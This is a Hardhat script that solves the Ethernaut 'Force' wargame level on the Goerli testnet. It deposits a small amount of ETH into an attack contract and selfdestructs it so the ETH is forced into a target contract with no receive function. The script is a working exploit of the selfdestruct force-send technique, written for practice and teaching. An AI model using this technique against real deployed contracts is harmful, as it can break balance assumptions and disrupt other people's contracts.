import { ethers } from "hardhat";

const attackForce = async () => {
    // change contract addresses here.
    const forceAddress = "0xc3C0633aAff54368AE13c2097832D0f3E43F75a9"; //type "await contract.address()" in ethernaut console
    // attackForce address = "0xA5543a41048CF3b45c971EA6933325a25F0083A2";

    // Don't touch below 🚀
    // You can use seldestrcut contract to send ETH to a contract with no receive function or fallback()
    // Additional read to understand more on selfdestruct:
    // https://docs.soliditylang.org/en/v0.6.0/units-and-global-variables.html#contract-related
    // typing all commands in console below
    const attack = await ethers.getContract("AttackForce");
    const provider = ethers.getDefaultProvider("goerli");
    const oldContractBalance = ethers.utils.formatEther(await provider.getBalance(forceAddress));
    console.log(`Force contract balance is: ${oldContractBalance} ETH`);
    console.log("Sending '0.0001' ETH to attack contract...");
    const tx1 = await attack.deposit({ value: ethers.utils.parseEther("0.0001") });
    const tx1Receipt = await tx1.wait();
    console.log(tx1Receipt);
    console.log("Sending ETH to Force contract by selfdestruct attack contract...");
    const tx2 = await attack.destruct(forceAddress);
    const tx2Receipt = await tx2.wait();
    console.log(tx2Receipt);
    console.log("Rechecking Force contract balance");
    const newContractBalance = ethers.utils.formatEther(await provider.getBalance(forceAddress));
    console.log(`Force contract balance is: ${newContractBalance} ETH`);
    if (newContractBalance > oldContractBalance) {
        console.log("Congrats!Sucessfuly transfered ETH to Force Contract. Submit to ethernaut...");
    } else {
        console.log("Failed to transfer ETH to Force Contract, review code above and try again...");
    }
};

attackForce()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
